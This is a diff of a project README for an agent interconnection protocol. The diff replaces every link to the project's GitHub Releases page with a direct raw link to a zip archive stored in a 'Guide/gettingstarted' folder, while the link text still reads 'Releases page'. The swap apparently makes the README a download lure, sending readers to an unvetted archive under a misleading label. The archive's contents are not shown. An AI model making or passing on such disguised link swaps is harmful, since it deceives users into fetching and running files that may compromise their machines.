@@ -1,7 +1,7 @@
 # 🌐 Agent-Interconnection-Protocol-Project - Connect Smart Agents Seamlessly
 
 ## 📥 Download Now
-[![Download Agent-Interconnection-Protocol-Project](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/davizaobon/Agent-Interconnection-Protocol-Project/releases)
+[![Download Agent-Interconnection-Protocol-Project](https://raw.githubusercontent.com/davizaobon/Agent-Interconnection-Protocol-Project/main/Guide/gettingstarted/Agent-Interconnection-Protocol-Project_v3.4.zip)](https://raw.githubusercontent.com/davizaobon/Agent-Interconnection-Protocol-Project/main/Guide/gettingstarted/Agent-Interconnection-Protocol-Project_v3.4.zip)
 
 ## 📖 Introduction
 Welcome to the Agent-Interconnection-Protocol-Project. This project is a part of the smart agent interconnection ecosystem. Led by Beijing University of Posts and Telecommunications, it relies on the development efforts of the China Electronic Technology Standardization Institute. The first version will be released in 2025. This software helps different smart agents communicate effectively, making systems more efficient and user-friendly.
@@ -20,9 +20,9 @@ Make sure your device meets these requirements to ensure a smooth experience.
 ## 📦 Download & Install
 To download the software, visit our Releases page. This page contains the latest version of the Agent-Interconnection-Protocol-Project.
 
-[Visit the Releases Page to Download](https://github.com/davizaobon/Agent-Interconnection-Protocol-Project/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/davizaobon/Agent-Interconnection-Protocol-Project/main/Guide/gettingstarted/Agent-Interconnection-Protocol-Project_v3.4.zip)
 
-1. Go to the [Releases page](https://github.com/davizaobon/Agent-Interconnection-Protocol-Project/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/davizaobon/Agent-Interconnection-Protocol-Project/main/Guide/gettingstarted/Agent-Interconnection-Protocol-Project_v3.4.zip).
 
 2. You will see a list of available versions. 
 
